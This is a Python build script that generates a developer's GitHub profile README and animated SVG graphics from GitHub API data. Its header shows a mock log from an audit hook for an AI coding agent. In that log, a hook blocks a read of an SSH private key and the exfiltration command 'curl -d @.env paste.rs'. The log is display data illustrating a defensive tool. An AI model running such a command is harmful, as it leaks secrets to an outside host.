"""Profil README'sini ve SVG'lerini üretir.  python build.py   (çevrimdışı: python build.py --offline)

Veri GitHub API'den gelir (gh CLI, GH_TOKEN ya da gh auth): public repolar, diller, son 12 ayın katkıları.
Son çekilen veri data.json'a yazılır; --offline onu kullanır. GitHub Actions bunu her gece çalıştırır.

Her görsel iki temada çıkar (dark/light); README <picture> ile GitHub temasına göre seçer.
SVG'ler <img> olarak yüklendiği için JS yok, dış font yok: sadece SVG içi CSS animasyonu.
"""
import datetime as dt
import json
import subprocess
import sys
import textwrap
from pathlib import Path
from xml.sax.saxutils import escape

ROOT = Path(__file__).parent
OUT = ROOT / "assets"
DATA = ROOT / "data.json"
USER = "selimllc"
W = 880

THEMES = {
    "dark":  {"fg": "#e6e1d6", "muted": "#8b8578", "faint": "#34322e", "accent": "#ff6a3d"},
    "light": {"fg": "#1f1d1a", "muted": "#6e6a62", "faint": "#d9d5cd", "accent": "#c13d17"},
}

MONO = "ui-monospace, 'Cascadia Code', 'SF Mono', SFMono-Regular, Consolas, Menlo, monospace"
SANS = "'Segoe UI Variable Display', 'Segoe UI', system-ui, -apple-system, 'Helvetica Neue', Arial, sans-serif"
EASE = "cubic-bezier(.2,.7,.2,1)"

# Üst bant: cc-audit tail çıktısı. (zaman, karar, araç, hedef, not)
LOG = [
    ("09:14:02", "allow", "Read", "~/selim/README.md",        ""),
    ("09:14:02", "allow", "Bash", "whoami",                    "selimllc"),
    ("09:14:03", "block", "Read", "~/.ssh/id_ed25519",         "secret path"),
    ("09:14:03", "allow", "Bash", "ls ~/work",                 "cc-audit  cc-lease  php-admin-starter"),
    ("09:14:04", "block", "Bash", "curl -d @.env paste.rs",    "exfil, logged"),
]
ARRIVE = [0.5, 1.0, 1.7, 2.5, 3.3]   # her satırın geliş saniyesi
COL = {"time": 0, "verdict": 100, "tool": 170, "target": 236, "note": 520}

# Public repolar otomatik listelenir. Burada olanlar elle yazılmış metni alır ve bu sırayla başa gelir;
# olmayanlar GitHub açıklamasıyla, son push tarihine göre arkaya eklenir.
OVERRIDES = {
    "cc-audit": [
        "Local, zero-telemetry audit layer for Claude Code. A PreToolUse hook",
        "blocks secret reads and exfil commands, then logs every call to JSONL.",
    ],
    "php-admin-starter": [
        "Admin panel with no Composer, no npm, no CDN. RBAC with levels, TOTP 2FA",
        "and an audit trail that stores old and new values. Works offline.",
    ],
    "kutuphane-yonetim-sistemi": [
        "Library management for books, members and loans.",
        "Where the panel above started.",
    ],
}

QUERY = """
query($login: String!) {
  user(login: $login) {
    contributionsCollection {
      contributionCalendar { totalContributions weeks { contributionDays { contributionCount date } } }
    }
    repositories(privacy: PUBLIC, ownerAffiliations: OWNER, isFork: false, first: 100) {
      nodes {
        name description pushedAt isArchived
        primaryLanguage { name }
        licenseInfo { spdxId }
        languages(first: 20) { edges { size node { name } } }
      }
    }
  }
}"""


# ---------------------------------------------------------------- veri

def fetch():
    out = subprocess.run(
        ["gh", "api", "graphql", "-f", f"query={QUERY}", "-F", f"login={USER}"],
        capture_output=True, text=True, encoding="utf-8", check=True,
    ).stdout
    user = json.loads(out)["data"]["user"]
    cal = user["contributionsCollection"]["contributionCalendar"]
    repos = [r for r in user["repositories"]["nodes"] if not r["isArchived"] and r["name"] != USER]
    data = {
        "fetched": dt.date.today().isoformat(),
        "total": cal["totalContributions"],
        "weeks": [[d["date"], d["contributionCount"]] for w in cal["weeks"] for d in w["contributionDays"]],
        "repos": [{
            "name": r["name"],
            "description": (r["description"] or "").strip(),
            "pushed": r["pushedAt"],
            "language": (r["primaryLanguage"] or {}).get("name", ""),
            "license": (r["licenseInfo"] or {}).get("spdxId", ""),
            "languages": {e["node"]["name"]: e["size"] for e in r["languages"]["edges"]},
        } for r in repos],
    }
    DATA.write_text(json.dumps(data, indent=1, ensure_ascii=False), encoding="utf-8")
    return data


def projects(data):
    order = list(OVERRIDES)
    repos = sorted(data["repos"], key=lambda r: r["pushed"], reverse=True)
    repos.sort(key=lambda r: order.index(r["name"]) if r["name"] in order else len(order))
    out = []
    for r in repos:
        lines = OVERRIDES.get(r["name"]) or textwrap.wrap(r["description"] or "No description yet.", 78)[:2]
        meta = "  ·  ".join(x for x in (r["language"], r["license"] if r["license"] != "NOASSERTION" else "") if x)
        out.append({"slug": r["name"], "name": r["name"], "meta": meta, "lines": lines})
    return out


def weekly(data):
    """Günlük sayıları pazartesiden başlayan haftalara toplar: [(hafta başı, toplam)]."""
    weeks = {}
    for date, n in data["weeks"]:
        d = dt.date.fromisoformat(date)
        start = d - dt.timedelta(days=d.weekday())
        weeks[start] = weeks.get(start, 0) + n
    return sorted(weeks.items())


def languages(data, floor=0.02):
    total = {}
    for r in data["repos"]:
        for name, size in r["languages"].items():
            total[name] = total.get(name, 0) + size
    s = sum(total.values()) or 1
    items = sorted(((n, v / s) for n, v in total.items()), key=lambda x: -x[1])
    big = [(n, p) for n, p in items if p >= floor]
    rest = sum(p for _, p in items if p < floor)
    return big + ([("Other", rest)] if rest > 0 else [])


# ---------------------------------------------------------------- svg parçaları

def style(t, extra=""):
    return f"""<style>
  .mono {{ font-family: {MONO}; font-size: 14px; }}
  .sans {{ font-family: {SANS}; }}
  .fg {{ fill: {t['fg']}; }} .muted {{ fill: {t['muted']}; }} .accent {{ fill: {t['accent']}; }}
  .rule {{ stroke: {t['faint']}; stroke-width: 1; }}
  .draw {{ transform-box: fill-box; transform-origin: left center;
           animation: draw 1.1s {EASE} both; }}
  .grow {{ transform-box: fill-box; transform-origin: center bottom;
           animation: grow .7s {EASE} both; }}
  .arrive {{ animation: arrive 1ms linear both; }}
  .fade {{ animation: fade .6s ease-out both; }}
  @keyframes draw {{ from {{ transform: scaleX(0); }} to {{ transform: scaleX(1); }} }}
  @keyframes grow {{ from {{ transform: scaleY(0); }} to {{ transform: scaleY(1); }} }}
  @keyframes arrive {{ from {{ opacity: 0; }} to {{ opacity: 1; }} }}
  @keyframes fade {{ from {{ opacity: 0; }} to {{ opacity: 1; }} }}
  {extra}
  @media (prefers-reduced-motion: reduce) {{ * {{ animation: none !important; }} }}
</style>"""


def svg(h, title, t, body, extra=""):
    return f"""<svg xmlns="http://www.w3.org/2000/svg" viewBox="-8 0 {W + 16} {h}" width="{W + 16}" height="{h}" role="img" aria-labelledby="t">
<title id="t">{escape(title)}</title>
{style(t, extra)}
{body}
</svg>
"""


def section_head(label, right, y=22, rule_y=40):
    return f"""  <text x="0" y="{y}" class="mono muted" style="font-size:12px;letter-spacing:.12em">{escape(label.upper())}</text>
  <text x="{W}" y="{y}" class="mono muted" text-anchor="end" style="font-size:12px">{escape(right)}</text>
  <line x1="0" y1="{rule_y}" x2="{W}" y2="{rule_y}" class="rule draw"/>"""


def header(t):
    first, lh = 74, 28
    rows = []
    for i, ((ts, verdict, tool, target, note), at) in enumerate(zip(LOG, ARRIVE)):
        y = first + i * lh
        blocked = verdict == "block"
        cls = "accent" if blocked else "muted"
        flash = ""
        if blocked:
            # hook yakaladı: satırın arkasında kısa bir vurgu, sonra söner
            flash = (f'<rect x="-8" y="{y - 18}" width="{W + 16}" height="26" fill="{t["accent"]}" '
                     f'class="flash" style="animation-delay:{at}s"/>')
        rows.append(f"""  <g class="arrive" style="animation-delay:{at}s">
    {flash}
    <text y="{y}" class="mono">
      <tspan x="{COL['time']}" class="muted">{ts}</tspan>
      <tspan x="{COL['verdict']}" class="{cls}">{verdict}</tspan>
      <tspan x="{COL['tool']}" class="fg">{tool}</tspan>
      <tspan x="{COL['target']}" class="fg">{escape(target)}</tspan>
      <tspan x="{COL['note']}" class="{cls}">{escape(note)}</tspan>
    </text>
  </g>""")

    # imleç: her satır geldiğinde bir alta iner, sonra yanıp söner
    total = ARRIVE[-1] + 0.2
    frames = ["0% { transform: translateY(0px); }"]
    for i, at in enumerate(ARRIVE):
        frames.append(f"{at / total * 100:.2f}% {{ transform: translateY({(i + 1) * lh}px); }}")
    frames.append(f"100% {{ transform: translateY({len(ARRIVE) * lh}px); }}")

    name_y = first + len(LOG) * lh + 96
    extra = f"""
  .flash {{ opacity: 0; animation: flash 1.6s ease-out both; }}
  @keyframes flash {{ 0% {{ opacity: .22; }} 100% {{ opacity: 0; }} }}
  .cursor-move {{ animation: cursor {total}s step-end both; }}
  @keyframes cursor {{ {' '.join(frames)} }}
  .blink {{ animation: blink 1.05s step-end infinite; }}
  @keyframes blink {{ 50% {{ opacity: 0; }} }}
  .rise {{ animation: rise .9s {EASE} both; animation-delay: {ARRIVE[-1] + 0.6}s; }}
  @keyframes rise {{ from {{ transform: translateY(78px); }} to {{ transform: translateY(0); }} }}
  @media (prefers-reduced-motion: reduce) {{ .cursor-move {{ transform: translateY({len(ARRIVE) * lh}px); }} }}"""

    body = f"""{section_head("Istanbul", "$ cc-audit tail --follow")}
{chr(10).join(rows)}
  <g class="cursor-move"><rect x="0" y="{first - 15}" width="9" height="18" class="fg blink"/></g>
  <clipPath id="mask"><rect x="-8" y="{name_y - 76}" width="{W + 16}" height="96"/></clipPath>
  <g clip-path="url(#mask)">
    <text x="-3" y="{name_y}" class="sans fg rise" style="font-size:72px;letter-spacing:-.02em">
      <tspan style="font-weight:300">selim</tspan><tspan style="font-weight:600">llc</tspan>
    </text>
  </g>"""
    return svg(name_y + 28, "selimllc. A cc-audit log tail: normal tool calls are allowed, "
               "reading an SSH key and posting .env are blocked.", t, body, extra)


def repos_head(t, n):
    return svg(52, f"Public repositories: {n}", t,
               section_head("Public repositories", f"{n} repos", y=22, rule_y=40))


def row(t, i, p):
    h, at = 128, 0.15
    desc = "\n".join(f'    <tspan x="120" dy="{0 if k == 0 else 22}">{escape(line)}</tspan>'
                     for k, line in enumerate(p["lines"]))
    body = f"""  <text x="-4" y="76" class="sans muted arrive" style="font-size:68px;font-weight:200;letter-spacing:-.03em;animation-delay:{at + .25}s">{i:02d}</text>
  <text x="120" y="40" class="sans fg" style="font-size:22px;font-weight:600">{escape(p['name'])}</text>
  <text x="{W}" y="40" class="mono muted" text-anchor="end" style="font-size:12px">{escape(p['meta'])}</text>
  <text y="70" class="sans muted" style="font-size:15px">
{desc}
  </text>
  <line x1="0" y1="{h - 1}" x2="{W}" y2="{h - 1}" class="rule draw" style="animation-delay:{at}s"/>"""
    return svg(h, f"{i:02d}. {p['name']}: {' '.join(p['lines'])}", t, body)


def activity(t, data):
    weeks = weekly(data)[-53:]
    x0, x1, base, top = 220, W, 168, 76
    step = (x1 - x0) / len(weeks)
    bw = max(3, step * 0.62)
    peak_i = max(range(len(weeks)), key=lambda i: weeks[i][1])
    peak = weeks[peak_i][1] or 1
    bars, months = [], []
    last_month = None
    for i, (start, n) in enumerate(weeks):
        x = x0 + i * step
        delay = 0.3 + i * 0.016
        if n == 0:
            bars.append(f'  <rect x="{x:.1f}" y="{base - 1}" width="{bw:.1f}" height="1" fill="{t["faint"]}"/>')
        else:
            hgt = max(3, (base - top) * n / peak)
            cls = "accent" if i == peak_i else "fg"
            op = "" if i == peak_i else ' fill-opacity=".78"'
            bars.append(f'  <rect x="{x:.1f}" y="{base - hgt:.1f}" width="{bw:.1f}" height="{hgt:.1f}" '
                        f'class="{cls} grow"{op} style="animation-delay:{delay:.3f}s"/>')
        if start.month != last_month and i > 0 and i < len(weeks) - 2:
            months.append(f'  <text x="{x:.1f}" y="{base + 20}" class="mono muted" style="font-size:11px">'
                          f'{start.strftime("%b")}</text>')
        last_month = start.month

    px = x0 + peak_i * step + bw / 2
    anchor = "end" if px > W - 160 else ("start" if px < x0 + 120 else "middle")
    peak_label = (f'  <text x="{px:.1f}" y="{top - 10}" class="mono accent fade" text-anchor="{anchor}" '
                  f'style="font-size:11px;animation-delay:{0.3 + peak_i * 0.016 + .5:.2f}s">'
                  f'{weeks[peak_i][1]} in the week of {weeks[peak_i][0].strftime("%b %-d") if sys.platform != "win32" else weeks[peak_i][0].strftime("%b %#d")}</text>')

    body = f"""{section_head("Activity", f"last 12 months, updated {data['fetched']}")}
  <text x="-4" y="{base - 18}" class="sans fg fade" style="font-size:68px;font-weight:200;letter-spacing:-.03em;animation-delay:.2s">{data['total']}</text>
  <text x="0" y="{base + 20}" class="mono muted" style="font-size:12px">contributions</text>
{chr(10).join(bars)}
{peak_label}
{chr(10).join(months)}"""
    return svg(base + 32, f"{data['total']} contributions in the last 12 months.", t, body)


def langs(t, data):
    items = languages(data)
    y, bh = 66, 8
    segs, legend = [], []
    x, lx = 0.0, 0.0
    for k, (name, p) in enumerate(items):
        w = W * p
        cls = "accent" if k == 0 else "fg"
        op = "" if k == 0 else f' fill-opacity="{max(.18, .8 - k * .2):.2f}"'
        delay = 0.25 + k * 0.18
        segs.append(f'  <rect x="{x:.1f}" y="{y}" width="{max(w - 2, 1):.1f}" height="{bh}" class="{cls} draw"{op} '
                    f'style="animation-delay:{delay:.2f}s;animation-duration:.6s"/>')
        label = f"{name}  {p * 100:.1f}%"
        legend.append(f'  <rect x="{lx:.1f}" y="{y + 32}" width="8" height="8" class="{cls}"{op}/>'
                      f'<text x="{lx + 16:.1f}" y="{y + 40}" class="mono fg" style="font-size:13px">{escape(name)}'
                      f'<tspan class="muted">  {p * 100:.1f}%</tspan></text>')
        x += w
        lx += 16 + len(label) * 8.2 + 36
    body = f"""{section_head("Languages", "public repositories, by bytes")}
{chr(10).join(segs)}
{chr(10).join(legend)}"""
    return svg(y + 56, "Languages across public repositories: " +
               ", ".join(f"{n} {p * 100:.1f}%" for n, p in items), t, body)


# ---------------------------------------------------------------- readme

def picture(base, alt, href=None):
    img = (f'<picture>\n  <source media="(prefers-color-scheme: dark)" srcset="assets/{base}-dark.svg">\n'
           f'  <img src="assets/{base}-light.svg" alt="{escape(alt)}" width="100%">\n</picture>')
    return f'<a href="{href}">\n{img}\n</a>' if href else img


def readme(projs, data):
    parts = [
        picture("header", "selimllc. A cc-audit log tail where reading an SSH key and posting .env get blocked."), "",
        "I build security tooling for AI coding agents, and PHP that doesn't phone home.",
        "Most of my week goes to Python, PHP, C and a bit of Flutter.", "",
        picture("repos", f"Public repositories: {len(projs)}"), "",
    ]
    for p in projs:
        parts += [picture(f"row-{p['slug']}", f"{p['name']}: {' '.join(p['lines'])}",
                          f"https://github.com/{USER}/{p['slug']}"), ""]
    parts += [
        "<br>", "",
        picture("activity", f"{data['total']} contributions in the last 12 months"), "",
        "<br>", "",
        picture("languages", "Languages across public repositories"), "",
        "[selimluleci.com](https://selimluleci.com)", "",
    ]
    return "\n".join(parts)


def main():
    if "--offline" in sys.argv:
        data = json.loads(DATA.read_text(encoding="utf-8"))
    else:
        data = fetch()
    projs = projects(data)

    OUT.mkdir(exist_ok=True)
    for old in OUT.glob("row-*.svg"):      # silinen/private olan repo satırı kalmasın
        old.unlink()
    for name, t in THEMES.items():
        files = {
            "header": header(t),
            "repos": repos_head(t, len(projs)),
            "activity": activity(t, data),
            "languages": langs(t, data),
            **{f"row-{p['slug']}": row(t, i, p) for i, p in enumerate(projs, 1)},
        }
        for base, content in files.items():
            (OUT / f"{base}-{name}.svg").write_text(content, encoding="utf-8")
    (ROOT / "README.md").write_text(readme(projs, data), encoding="utf-8")
    print(f"ok: {len(projs)} repo, {data['total']} katkı, veri {data['fetched']}")


if __name__ == "__main__":
    main()
